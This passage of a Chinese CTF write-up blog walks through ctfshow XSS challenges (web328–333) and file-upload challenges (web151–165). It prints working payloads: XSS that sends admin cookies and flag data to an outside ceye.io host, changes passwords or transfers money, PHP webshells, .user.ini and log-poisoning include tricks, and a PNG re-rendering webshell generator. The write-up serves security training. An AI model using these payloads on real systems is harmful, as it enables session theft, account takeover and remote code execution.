src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web327-3.png"></p><h3 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h3><p>打开网页显示的是登录框，不知道是什么类型的XSS</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web328.png"></p><p>在功能处注册一个 admin 账号，显示我们并不是 admin，说明admin账号存在</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web328-1.png"></p><p>换个思路，注册一个用payload作为用户名的账号，等管理员点击我们的时候就会被打到cookie。经测试使用body的 payload 是打不到的，那我改换最初的 payload 试试，用它作为用户名注册</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">window</span>.open(<span class="string">&#x27;http://bb9rcm.ceye.io/&#x27;</span>+<span class="built_in">document</span>.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>注册成功后刷下页面，ceye平台可以打到 admin 的 cookie，但是没有 flag。</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web328-2.png"></p><p>尝试将我们的cookie替换成admin的，点击 save（cookie栏左边内存卡的图标）</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web328-3.png"></p><p>随后我们刷新一下页面，发现已经是管理员了</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web328-4.png"></p><h3 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h3><p>方法同上，能得到cookie但是还是访问不了页面</p><p>原因是，管理员访问了页面就退出了，相当于现在得到的最新cookie是管理员上一次用的cookie，所以这一次不能常规思路了。我们要在对的页面遍历那个表单，然后将flag直接发送出来，用到 JS 代码。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">$(<span class="string">&#x27;.laytable-cell-1-0-1&#x27;</span>).each(<span class="function"><span class="keyword">function</span>(<span class="params">index,value</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(value.innerHTML.indexOf(<span class="string">&#x27;ctf&#x27;</span>+<span class="string">&#x27;show&#123;&#x27;</span>)&gt;-<span class="number">1</span>)&#123;<span class="built_in">window</span>.location.href=<span class="string">&#x27;http://bb9rcm.ceye.io/&#x27;</span>+value.innerHTML;</span><br><span class="line">&#125;&#125;);&lt;/script&gt;</span><br><span class="line">或</span><br><span class="line">&lt;script&gt;</span><br><span class="line">$(<span class="string">&#x27;.laytable-cell-1-0-1&#x27;</span>).each(<span class="function"><span class="keyword">function</span>(<span class="params">index,value</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(value.innerHTML.indexOf(<span class="string">&#x27;ctf&#x27;</span>+<span class="string">&#x27;show&#123;&#x27;</span>)&gt;-<span class="number">1</span>)&#123;<span class="built_in">window</span>.open(<span class="string">&#x27;http://bb9rcm.ceye.io/&#x27;</span>+value.innerHTML)</span><br><span class="line">&#125;&#125;);&lt;/script&gt;</span><br><span class="line"><span class="comment">//laytable-cell-1-0-1这是那个表单的类名，使用(&#x27;ctf&#x27;+&#x27;show&#123;&#x27;)而不是使用(&#x27;ctfshow&#123;&#x27;)的原因是使用前者会输出我们的payload的，因为第一次登进去的时候我们的身份信息带有(&#x27;ctfshow&#x27;)。而使用后者则不会，因为只查找 ctfshow&#123; 字符串，而不会匹配到&#x27;ctf&#x27;+&#x27;show&#123;&#x27;。使用 &gt;-1 而不是 &gt;0 ，因为字符串不大于0。使用 +value.innerHTML 而不是 +document.cookie ，因为我们要输出表单内容而不是 cookie。</span></span><br></pre></td></tr></table></figure><p>注册一个账号，使用 payload 当做密码，随后登录，来到 ceye 刷新等待</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web329-1.png"></p><h3 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h3><p>这一题增加了一个修改密码的功能</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web330.png"></p><p>使用前面的方法已经解不出题了，我们抓包折后发现了修改密码的接口<code>/api/change.php?p=xxx</code>，所以思路就是 XSS 使管理员直接访问我们构造的修改自己密码的payload，达到修改管理员密码的效果</p><p> <img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web330-3.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web330-1.png"></p><p>payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">window</span>.open(<span class="string">&#x27;http://127.0.0.1/api/change.php?p=admin&#x27;</span>)&lt;/script&gt;</span><br><span class="line">或</span><br><span class="line">&lt;script&gt;<span class="built_in">window</span>.location.href=<span class="string">&#x27;http://127.0.0.1/api/change.php?p=admin&#x27;</span>;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用127.0.0.1是因为管理员应该是在他本地登录的</span></span><br></pre></td></tr></table></figure><p>payload 要要用在用户名上，用在密码是不行的。然后我们稍微等待一会，即可使用 admin：admin 登录</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web330-2.png"></p><h3 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h3><p>和上一题一样，只是请求方式从 GET 换成了 POST</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web331.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web331-1.png"></p><p>payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.ajax(&#123;<span class="attr">url</span>:<span class="string">&#x27;api/change.php&#x27;</span>,<span class="attr">type</span>:<span class="string">&#x27;post&#x27;</span>,<span class="attr">data</span>:&#123;<span class="attr">p</span>:<span class="string">&#x27;admin&#x27;</span>&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web331-2.png"></p><h3 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h3><p>这一题说花9999元就能买flag</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web332.png"></p><p>wp说在充值的地方给 admin 转账9999即可使我们的账号拥有9999元，但是真正执行后发现</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web332-1.png"></p><p>原来是环境问题，重启环境试试</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web332-2.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web332-3.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web332-4.png"></p><h3 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h3><p>这一题不能直接像上一题一样了，但是它可以自己给自己转账。我们原本有5元，可以给自己转4元，然后我们自己就有9元了，接着给自己转8元，以此类推，只要转账金额不超过余额就行。逻辑问题就是收款方增加而付款方不减钱等等</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web333.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web333-1.png"></p><p>看JS源码和抓包查看api之后，也可以这么解，注册两个账号，使用XSS让管理员给我们转账</p><p>账号1</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.ajax(&#123;<span class="attr">url</span>:<span class="string">&#x27;api/amount.php&#x27;</span>,<span class="attr">type</span>:<span class="string">&#x27;post&#x27;</span>,<span class="attr">data</span>:&#123;<span class="attr">u</span>:<span class="string">&#x27;123&#x27;</span>,<span class="attr">a</span>:<span class="number">9999</span>&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>然后再注册一个用户名为123的账户</p><p>等下XSS成功之后，123账号就会得到9999元了。</p><h2 id="文件上传（151-170）"><a href="#文件上传（151-170）" class="headerlink" title="文件上传（151-170）"></a>文件上传（151-170）</h2><h3 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h3><p>打开网页发现只是前端过滤(最简单的就是修改前端代码添加php扩展)，那么我们抓包改包即可，马子不能错了语言，PHP。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web151.png"></p><p>将马子后缀改名为 png</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web151-1.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web151-2.png"></p><p>修改后缀名，放包</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web151-3.png"></p><p>上传成功，访问马子执行命令</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web151-4.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web151-5.png"></p><p>因为我们在 upload 目录，flag在上一级，所以</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pass=system(<span class="string">&#x27;tac ../flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h3><p>这题虽然使用后端校验，但是还是可以直接抓包修改文件后缀上传，与上一题一样的解法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pass=system(<span class="string">&#x27;tac ../flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h3><p>这一题不能再使用上一题做法，我们大小写绕过，显示上传成功，但是无法解析，应该与文件名有关不能大小写</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web153.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web153-1.png"></p><p>重新抓包，把文件后缀改成php,上传失败,改成xxxxx上传成功,得知是黑名单过滤。访问上级目录发现有回显，判断应该是 index.php，后经访问 index.php证实</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web153-2.png"></p><p>上传phtml后缀,可以成功上传,但是无法解析,可以试试上传配置文件,访问upload,发现有可执行文件index.php,可以用上传<code>.user.ini</code>来进行文件包含(题目是nginx)</p><blockquote><p><code>user.ini.</code>它比<code>.htaccess</code>用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法。<br>条件:<br>服务器脚本语言为PHP<br>对应目录下面有可执行的php文件,如index.php。有可执行文件才会调用这个配置文件<br>服务器使用CGI／FastCGI模式</p></blockquote><p>我们可以配置一个文件包含（可从官方文档查看方法）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=mtrleed.txt <span class="comment">// 包含mtrleed.txt文件</span></span><br></pre></td></tr></table></figure><p>上传配置文件</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web153-3.png"></p><p>上传马子</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web153-4.png"></p><p>命令执行</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web153-5.png"></p><h3 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h3><p>这题使用上一题的解法时遇到一个问题，在上传马子的时候，显示内容不合规</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web154-1.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web154.png">    </p><p>后经测试发现文件的内容不能含有 php ，所以我们使用php短标签效果是一样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先上传<code>·user.ini</code>配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=mtrleed.txt // 包含mtrleed.txt文件</span><br></pre></td></tr></table></figure><p>然后上传短标签的马子</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web154-2.png"></p><p>执行命令</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web154-3.png"></p><h3 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h3><p>还是可以上传配置文件，再上传短标签马子。和上一题一样</p><h3 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h3><p>还是可以上传配置文件，但是短标签的马子不能直接上传了</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web156.png"></p><p>尝试添加 png 文件头。文件头是文件类型的标志，结果加了文件头还是不行，猜测应该是文件内容被过滤什么了，使用二分法进行判断</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=@eval( //可以</span><br><span class="line">&lt;?=@eval($_POS//可以</span><br><span class="line">&lt;?=@eval($_POST[&#x27;pa//不可以</span><br><span class="line">判断结果应该是 [] 或 &#x27;&#x27;</span><br></pre></td></tr></table></figure><p>我们现将中括号替换成大括号，可以上传成功了。</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web156-1.png"></p><h3 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h3><p>继续上传 <code>.user.ini</code>，随后上传马子，上一题的马子不能用了，继续二分法</p><p>最后发现过滤了大括号和分号，那么我们尝试使用不带大括号和中括号的命令，且PHP最后的分号是可以不写的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>@<span class="keyword">eval</span> (array_pop(<span class="variable">$_POST</span>))<span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//POST 传入的命令会被弹出然后被文件包含执行</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web157-2.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web157.png"></p><p>随便使用一个参数POST命令上去</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web157-1.png"></p><h3 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h3><p>继续上传配置文件，马子和上一题一样</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web158.png"></p><h3 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h3><p>继续上传配置文件，在上传马子的时候发现过滤了小括号，需要找一找不带括号的马子</p><p>这时候我们可以这样，上传一个文件，内容是包含系统日志文件，然后我们在随便上传一个文件，而数据包的头我们可以随意构造，可以写我们的马子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=include &#x27;/var/log/nginx/access.log&#x27;?&gt;</span><br></pre></td></tr></table></figure><p>但是过滤了 log 所以我们使用字符串连接符连接一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=include &#x27;/var/l&#x27;.&#x27;og/nginx/access.l&#x27;.&#x27;og&#x27;?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web159.png"></p><p>成功包含到日志文件</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web159-1.png"></p><p>然后我们随便上传一个文件，文件头部可以构造 payload</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web159-4.png"></p><p>然后就可以命令执行了</p><p>另一种解法：因为（）被过滤了，但是 PHP 命令执行的方式还可以是反引号 ``（这文件上传还考察了命令执行的绕过），所以我们在上传完配置文件后，马子可以这么写</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`tac ../f*`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web159-5.png"></p><p>随后直接访问 upload 执行文件包含即可</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web159-7.png"></p><h3 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h3><p>和前面刷命令执行，代码执行的很像，就是命令执行，代码执行的绕过</p><p>继续上传配置文件 <code>.user.ini</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=mtrleed.txt</span><br></pre></td></tr></table></figure><p>但是这题过滤的反引号和空格</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web160.png"></p><p>方法一：使用日志包含</p><p>方法二：使用php伪协议来读取</p><p>上传的马子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">include</span><span class="string">&quot;ph&quot;</span>.<span class="string">&quot;p://filter/convert.base64-encode/resource=../flag.p&quot;</span>.<span class="string">&quot;hp&quot;</span><span class="meta">?&gt;</span> <span class="comment">//可以不需要空格，被过滤的字符串我们使用字符串连接</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web160-1.png"></p><p>随后直接访问 upload 进行文件包含，结果进行base64解码就行</p><h3 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h3><p>wp 说这题读取了文件的16进制来检查文件，所以我们的文件需要在原来的基础上加上文件头，这里添加的是GIF的文件头<code>GIF89a</code>(PNG的文件头死活弄不成)</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web161.png"></p><p>上马子</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web161-1.png"></p><h3 id="web162"><a href="#web162" class="headerlink" title="web162"></a>web162</h3><p>这题把flag和 . 给过滤了，所以我们不能包含有. 的东西了。可以远程文件包含的方式解题，包含VPS的长地址，地址可以访问到一句话木马，长地址是没有点的（师傅给的地址不能用了）</p><p>先上传一个配置文件包含一个不带后缀的文件</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web162.png"></p><p>然后上传一个不带后缀的文件，文件内容是VPS地址。而地址上的资源是一句话</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web162-1.png"></p><p>正常来说这样就可以了（这个远程地址不能用了）</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web162-2.png"></p><h3 id="web163"><a href="#web163" class="headerlink" title="web163"></a>web163</h3><p>这题原本是让我们使用条件竞争的，马子文件上传之后马上就被删了。但是我们还是可以直接使用远程文件包含的方式。直接在配置文件里包含</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=http://1231231231/</span><br></pre></td></tr></table></figure><h3 id="web164"><a href="#web164" class="headerlink" title="web164"></a>web164</h3><p>本题考察png图片的二次渲染</p><blockquote><p>二次渲染 将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的。 大佬链接：<a href="https://www.fujieace.com/penetration-test/upload-labs-pass-16.html">https://www.fujieace.com/penetration-test/upload-labs-pass-16.html</a></p></blockquote><p>首先只能上传png文件</p><p>上传图片马，发现没有办法执行</p><p>在bp上发现图片中php代码没有了，猜测是进行了二次渲染</p><p>绕过二次渲染的png脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="variable">$img</span> = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; sizeof(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = imagecolorallocate(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   imagesetpixel(<span class="variable">$img</span>, round(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">imagepng(<span class="variable">$img</span>,<span class="string">&#x27;1.png&#x27;</span>);  <span class="comment">//要修改的图片的路径</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* 木马内容</span></span><br><span class="line"><span class="comment">&lt;?$_GET[0]($_POST[1]);?&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//imagepng($img,&#x27;1.png&#x27;);  要修改的图片的路径,1.png是使用的文件，可以不存在</span></span><br><span class="line"><span class="comment">//会在目录下自动创建一个1.png图片</span></span><br><span class="line"><span class="comment">//图片脚本内容：$_GET[0]($_POST[1]);</span></span><br><span class="line"><span class="comment">//使用方法：例子：查看图片，get传入0=system；post传入tac flag.php</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">------------------------------------</span><br><span class="line">           创建<span class="number">1</span>.png图片成功！      </span><br><span class="line">------------------------------------</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>执行该脚本生成一张 png，然后上传</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web164.png">    </p><p>直接上传</p><p>然后点击查看文件</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web164-2.png">    </p><p>然后添加参数并POST命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;0=system</span><br><span class="line">1=tac f*</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web164-1.png"></p><p>随后Ctrl+s保存图片，使用工具查看，那到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web164-3.png"></p><h3 id="web165"><a href="#web165" class="headerlink" title="web165"></a>web165</h3><p>本题考察 jpg 文件二次渲染</p><p>右键查看源代码发现需要 jpg 文件</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web165.png"></p><p>上脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span 